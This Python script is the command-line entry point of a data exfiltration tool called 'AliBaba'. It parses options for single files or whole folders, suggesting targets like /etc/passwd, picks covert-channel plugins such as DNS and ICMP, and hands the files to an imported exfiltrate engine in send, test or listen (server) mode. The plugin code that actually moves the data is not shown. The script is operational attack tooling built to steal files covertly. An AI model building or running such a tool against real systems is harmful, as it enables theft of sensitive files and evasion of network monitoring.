#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import argparse
from os import listdir
from os.path import isfile, join
import json
from utils import util, constants
from model.engine import exfiltrate
from model.plugininventory import active_plugins


def main():
    parser = argparse.ArgumentParser(description='AliBaba')
    parser.add_argument('-S', action="store_true", dest="show_plugins",
                        default=False, help="Show current available plugins")
    parser.add_argument('-c', action="store", dest="config_file",
                        default="resources/conf.json", help="Configuration file (eg. '-c resources\conf.json')")
    parser.add_argument('-P', action="store_true", dest="all_plugins",
                        default=False, help="Mode for using all available plugins")
    parser.add_argument('-p', action="store", dest="plugins_text",
                        default=None, help="Plugins to use (eg. '-p dns,icmp')")
    parser.add_argument('-f', action="store", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-L', action="store_true", dest="mode_listen",
                        default=False, help="Server mode")
    parser.add_argument('-T', action="store_true", dest="mode_test",
                        default=False, help="Mode for testing with probe file")
    options = parser.parse_args()

    # Show available plugins
    if options.show_plugins:
        util.ok('Available plugins: {}'.format(constants.SEP_PLUGINS.join(active_plugins.keys())))
    # Operation
    else:
        # Read configuration file
        if options.config_file is None:
            util.warning('Specify a configuration file!')
            parser.print_help()
            sys.exit(-1)
        else:
            with open(options.config_file) as data_file:
                config = json.load(data_file)

        # Parse plugins and convert to list of strings
        if options.all_plugins:
            plugins_list = list(active_plugins.keys())
        elif options.plugins_text:
            plugins_list = options.plugins_text.split(constants.SEP_PLUGINS)
        else:
            util.warning('Specify a plugins!')
            parser.print_help()
            sys.exit(-1)

        # Listen mode
        if options.mode_listen:
            exfiltrate(config=config, plugins_list=plugins_list, files=None, listen_mode=options.mode_listen)
        # Send mode
        else:
            files = []
            # Test mode
            if options.mode_test:
                files = [config['test_file']]
                for p in plugins_list:
                    util.ok("Starting test with plugin {}!".format(p))
                    try:
                        exfiltrate(config=config, plugins_list=[p], files=files)
                    except Exception:
                        util.warning("Test with plugin {} failed!".format(p))
                        pass
                util.ok("Starting test with all configured plugins!")
                exfiltrate(config=config, plugins_list=plugins_list, files=files)
            # Real mode
            else:
                if options.folder is None and options.file is None:
                    util.warning("Specify a file or a folder!")
                    parser.print_help()
                    sys.exit(-1)
                if options.folder:
                    files = ["{0}{1}".format(options.folder, f) for
                             f in listdir(options.folder)
                             if isfile(join(options.folder, f))]
                if options.file:
                    files.append(options.file)
                exfiltrate(config=config, plugins_list=plugins_list, files=files, listen_mode=options.mode_listen)

if __name__ == '__main__':
    main()